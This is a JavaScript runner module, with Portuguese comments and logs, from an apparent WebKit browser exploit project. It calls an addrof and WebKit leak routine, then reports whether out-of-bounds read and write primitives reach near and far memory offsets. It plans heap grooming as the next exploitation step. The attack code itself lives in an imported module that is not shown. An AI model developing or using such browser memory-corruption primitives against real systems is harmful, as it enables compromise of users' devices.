// js/script3/runAllAdvancedTestsS3.mjs (Runner para R57 - Verificação de Leitura Assimétrica)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R57 as executeTest,
    FNAME_MODULE
} from './testArrayBufferVictimCrash.mjs';

async function runStrategy_AsymmetricVerify_R57() {
    const FNAME_RUNNER = "runStrategy_AsymmetricVerify_R57";
    logS3(`==== INICIANDO Estratégia (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeTest();
    const module_name_for_title = FNAME_MODULE;

    if (!result) {
        document.title = `${module_name_for_title}: Invalid Result Obj`;
        logS3(`  RUNNER R57(Asymmetric): Objeto de resultado inválido ou nulo.`, "critical", FNAME_RUNNER);
        return;
    }

    logS3(`  --- RESULTADO DA VERIFICAÇÃO DA PRIMITIVA R/W ---`, "info_emphasis", FNAME_RUNNER);
    if (result.errorOccurred) {
        logS3(`    FALHA GERAL: ${result.errorOccurred}`, "critical", FNAME_RUNNER);
    } else {
        logS3(`    Teste de Escrita Segura (Write-Near): ${result.write_at_safe_offset_ok ? 'SUCESSO' : 'FALHA'}`, result.write_at_safe_offset_ok ? 'good' : 'critical', FNAME_RUNNER);
        logS3(`    Teste de Leitura Segura (Read-Near): ${result.read_at_safe_offset_ok ? 'SUCESSO' : 'FALHA'}`, result.read_at_safe_offset_ok ? 'good' : 'critical', FNAME_RUNNER);
        logS3(`    Teste de Leitura de Risco (Read-Far): ${result.read_at_risky_offset_ok ? 'SUCESSO (Longo Alcance!)' : 'FALHA (Curto Alcance?)'}`, result.read_at_risky_offset_ok ? 'vuln_potential' : 'warn', FNAME_RUNNER);
        logS3(`    CONCLUSÃO: ${result.notes}`, "info_emphasis", FNAME_RUNNER);
        
        if (result.read_at_risky_offset_ok) {
            logS3(`    PRÓXIMO PASSO: Como 'arb_read' tem longo alcance, a estratégia 'Heap Grooming + OOB Scan' é VIÁVEL.`, "good", FNAME_RUNNER);
            document.title = `R/W Assimétrico CONFIRMADO!`;
        } else {
            logS3(`    PRÓXIMO PASSO: A primitiva OOB é de curto alcance para leitura e escrita. Precisamos de uma nova estratégia de exploração.`, "warn", FNAME_RUNNER);
            document.title = `Primitiva OOB de Curto Alcance.`;
        }
    }

    logS3(`==== Estratégia (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R57_AsymmetricVerify (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runStrategy_AsymmetricVerify_R57();
    
    logS3(`\n==== Script 3 R57_AsymmetricVerify (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
}
